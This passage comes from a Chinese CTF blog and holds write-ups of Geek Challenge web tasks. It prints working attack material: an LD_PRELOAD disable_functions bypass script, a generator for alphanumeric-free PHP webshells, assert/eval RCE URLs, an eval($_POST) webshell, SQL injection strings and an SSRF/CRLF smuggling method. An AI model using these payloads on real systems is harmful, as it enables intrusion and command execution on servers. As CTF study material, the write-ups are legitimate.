<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//设置EVIL_CMDLINE环境变量</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//加载恶意动态库</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>第十届极客大挑战Write-up</title>
    <url>/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p><img src="/2019/10/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>











<h2 id="BurpSuiiiiiit-拿起你的burp，开始战斗吧"><a href="#BurpSuiiiiiit-拿起你的burp，开始战斗吧" class="headerlink" title="BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧"></a>BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧</h2><p>附件下载下来，解压得到Extender.jar文件</p>
<p>从名字和格式看应该BurpSuit的扩展包，用BP导入</p>
<p>​      <img src="/2019/10/第十届极客大挑战Write-up/1571495641219.png" alt="1571495641219"></p>
<p>​      <img src="/2019/10/第十届极客大挑战Write-up/1571374457080.png" alt="1571374457080"><br>​<br>​              导入失败，并提示我们查看errors页面<br>​<br>​             <img src="/2019/10/第十届极客大挑战Write-up/1571374537984.png" alt="1571374537984"></p>
<p>​        flag直接就出来了</p>
<h2 id="性感潇文清，在线算卦：动作快点才能算到好卦。"><a href="#性感潇文清，在线算卦：动作快点才能算到好卦。" class="headerlink" title="性感潇文清，在线算卦：动作快点才能算到好卦。"></a>性感潇文清，在线算卦：动作快点才能算到好卦。</h2><p>输入姓名和生日后，返回了一个路径</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571374815419.png" alt="1571374815419"></p>
<p>直接访问试下</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571374878503.png" alt="1571374878503"></p>
<p>回到主页，查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571374951634.png" alt="1571374951634"></p>
<p>提示我们条件竞争，从源码看我们输入u和p后，flag会写入到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>​        0.1s后再把flag换成 you are too slow</p>
<p>​        所以我们先一直访问存在flag的这个文件，然后在提交u和p，在flag生成的一瞬间把它读取</p>
<p>​        直接上burpsuit</p>
<p>​    <img src="/2019/10/第十届极客大挑战Write-up/1571375619875.png" alt="1571375619875"></p>
<p>​    <img src="/2019/10/第十届极客大挑战Write-up/1571376044998.png" alt="1571376044998"></p>
<p>​    payload设置为空，数量200个。</p>
<p>​    <img src="/2019/10/第十届极客大挑战Write-up/1571375724646.png" alt="1571375724646"></p>
<p>​    <img src="/2019/10/第十届极客大挑战Write-up/1571375756868.png" alt="1571375756868"></p>
<p>​    payload同样为空，数量为1.</p>
<p>​    2攻击后，3立马攻击</p>
<p>​    <img src="/2019/10/第十届极客大挑战Write-up/1571375974330.png" alt="1571375974330"></p>
<p>​    得到flag</p>
<h2 id="Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"><a href="#Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！" class="headerlink" title="Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"></a>Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！</h2><p><img src="/2019/10/第十届极客大挑战Write-up/1571386357741.png" alt="1571386357741"></p>
<p>什么防护都没有 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/1571387426532.png" alt="1571387426532">    </p>
<p>直接进后台</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571387449879.png" alt="1571387449879"></p>
<h2 id="RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I don’t think U can system RCE, prove to me"></a>RCE me: I don’t think U can system RCE, prove to me</h2><p>这道题学到了很多！</p>
<p>打开网页看看</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571495997995.png" alt="1571495997995"></p>
<p>GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
<p>所以我们要先绕过这个限制，执行命令。</p>
<p>参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">p神</a>不含数字和字母的webshell</p>
<p>构造脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<p>构造如下URl</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



<p><img src="/2019/10/第十届极客大挑战Write-up/1571497597408.png" alt="1571497597408"></p>
<p>查看某些关键参数</p>
<ul>
<li>​    如系统信息</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571499066521.png" alt="1571499066521"></p>
<ul>
<li>disable_functions</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571499768310.png" alt="1571499768310"></p>
<p>命令执行函数都被禁止了</p>
<ul>
<li>allow_url_*</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571498825445.png" alt="1571498825445"></p>
<p>关于这两个参数可以参考这篇文章<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">php伪协议</a></p>
<ul>
<li>sendmail_*</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571499021494.png" alt="1571499021494"></p>
<ul>
<li>open_basedir</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571500306817.png" alt="1571500306817"></p>
<p>并没有限制我们目录。如果有可以参考这篇<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">文章</a>绕过</p>
<p>既然不能执行命令那就用var_dump(scandir())来查看文件信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/1571501644752.png" alt="1571501644752"></p>
<p>但感觉挺麻烦的，后面队友搞了个这个(躺着真舒服 )，直接蚁剑连(菜刀不行)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/1571502520704.png" alt="1571502520704"></p>
<p>发现主目录下有有flag和readflag，flag只能root才能查看</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571502747158.png" alt="1571502747158"></p>
<p>把readflag下载下来，反编译了一下</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571502795907.png" alt="1571502795907"></p>
<p>那么思路也就清晰起来了，bypass disable_functions  执行readflag</p>
<p>我们这里利用LD_PRELOAD劫持共享库，从而执行命令</p>
<p>具体原理看看<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">出题人的博客</a>和<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>首先上传恶意so文件，上面的github项目中有，注意操作系统位数</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/1571503296101.png" alt="1571503296101"></p>
<p>并且重命名为123.so</p>
<p>然后上传123.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后通过include()包含文件，执行系统命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/1571503618681.png" alt="1571503618681"></p>
<h2 id="李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code"><a href="#李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code" class="headerlink" title="李三的代码审计笔记第一页：Talk is easy ,show me the code."></a>李三的代码审计笔记第一页：Talk is easy ,show me the code.</h2><p>访问题目页面，给了源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在具有公网IP的服务器上，放置以下两个文件</p>
<p>req.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.txt</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101124245849.png" alt="image-20191101124245849"></p>
<p>1.txt要有可写权限</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101124431268.png" alt="image-20191101124431268"></p>
<h2 id="服务端检测系统：emm，自己看"><a href="#服务端检测系统：emm，自己看" class="headerlink" title="服务端检测系统：emm，自己看"></a>服务端检测系统：emm，自己看</h2><p>SSRF还没有写过题目，利用复现学习一下</p>
<p>首先有个admin.php</p>
<p>但要求127.0.0.1才能访问</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211164956360.png" alt="image-20191211164956360"></p>
<p>有index.php的源码，</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211164910208.png" alt="image-20191211164910208"></p>
<p>这里利用index.php SSRF访问admin.php</p>
<p>但要绕过“/anything”</p>
<p>这里可以构造url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p>
<p>这样“/anything” 就成了一个参数</p>
<p>显示failed是因为采用GET请求方式，服务端是不会返回Allow头的，而且这里的SSRF没有回显，只有一个显示响应体长度的语句</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211195729531.png" alt="image-20191211195729531"></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure>

<p>这句 $method可控，所以传入%s% 覆盖后 %s%%d 双百分号返回一个%,但这时 %d 已经是一个字符串</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211202422540.png" alt="image-20191211202422540"></p>
<p>得到admin.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于HTTP头</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">http头的格式：</span><br><span class="line"></span><br><span class="line">请求方法 /路径 HTTP/版本</span><br><span class="line">头字段: 值</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">trueGET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">trueHost: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>http头部的各个字段之间用CRLF(\r\n)(%0d%0a)分割<br>http请求头(响应头)和请求体(响应体)之间用两个CRLF分割</p>
<p>关于Http请求</p>
<p>get请求:</p>
<pre><code>GET / HTTP/1.1
Host: 127.0.0.1</code></pre><p>post请求</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-from-urlencoded
Content-Length: 3

x=1</code></pre><p>http头的字段（常见）<br>        Host</p>
<pre><code>用于多个域名映射到同一个ip时，按照Host的内容匹配不同网站内容，每个Http头必须有Host头
当这个目的主机上只有一个网站，那么Host字段内容可以为任意值</code></pre><p>Content-Type</p>
<p>表明内容部分的编码格式和媒体类型 post/put等方式必须有(如果有请求体)</p>
<p>请求头中的Content-Type<br>GET请求:<br>GET没有请求实体部分，所以请求头中不需要设置Content-Type字段<br>POST/PUT请求<br>如果post/put请求有请求体(有传值)，那么必须要设置Content-Type字段(否则服务端可能无法处理你的请求)</p>
<pre><code>第一类：raw原始类型，可以上传任意格式的文本，比如text、json、xml、html…(中文不进行编码)
text请求：Content-Type: text/plain
json请求：Content-Type: application/json
html请求：Content-Type: text/html
第二类：application/x-www-from-urlencoded，会将表单内的数据转换拼接成key-value对(对非ascii码进行编码)
Content-Type: application/x-www-from-urlencoded
第三类：multipart/from-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。
Content-Type: multipart/from-data;boundary=xxx
在请求体中会有一个Content-Disposition字段，用于描述提交的表单的具体信息</code></pre><p>响应头中的Content-Type：<br> 用来告诉客户端，服务端返回的真实内容类型是什么。浏览器或客户端会根据这个值来做一些操作。</p>
<p> Content-Length 表示内容部分的长度 post/put等方式必须有(如果有请求体)</p>
<p>在源码中使用的是stream_context_create()函数发起HTTP请求</p>
<p>这里如http协议头等一些信息，作为一个数组传入。所以我们能利用CRLF构造一个新的POST包</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191212220127675.png" alt="image-20191212220127675"></p>
<p>这里我们把url改成自己服务器的ip，看看经过处理后的POST是什么样子。</p>
<p>这个POST包最后也加上了一些字符串，所以为了防止iwantflag参数被污染，所以我们传入第二个参数b</p>
<p>而且为了从index.php得到回显，我们依旧要覆盖 %d 所以b=%s% </p>
<p>还有一点，&amp;在URL中是具有分割参数的作用，所以要进行URL编码</p>
<p>最后的payload如下</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191212074711793.png" alt="image-20191212074711793"></p>
<h2 id="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"><a href="#Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！" class="headerlink" title="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"></a>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！</h2><p>熟悉的界面</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101125127520.png" alt="image-20191101125127520"></p>
<p>同样的手法</p>
<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">‘</span>=<span class="string">’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">‘=’</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101201215464.png" alt="image-20191101201215464"></p>
<p>但这个字符串并不是flag，估计在数据库中</p>
<p>利用Payload测试，禁用了 insert，having等，可以利用<code>#</code> 闭合。</p>
<p>可以联合注入，报错注入，盲注。</p>
<p>这里用最简单的联合注入。</p>
<p>先判断字段数</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101202502733.png" alt="image-20191101202502733"></p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101202533747.png" alt="image-20191101202533747"></p>
<p>字段数为3</p>
<p>获取回显点</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101203249710.png" alt="image-20191101203249710"></p>
<p>获取数据库名</p>
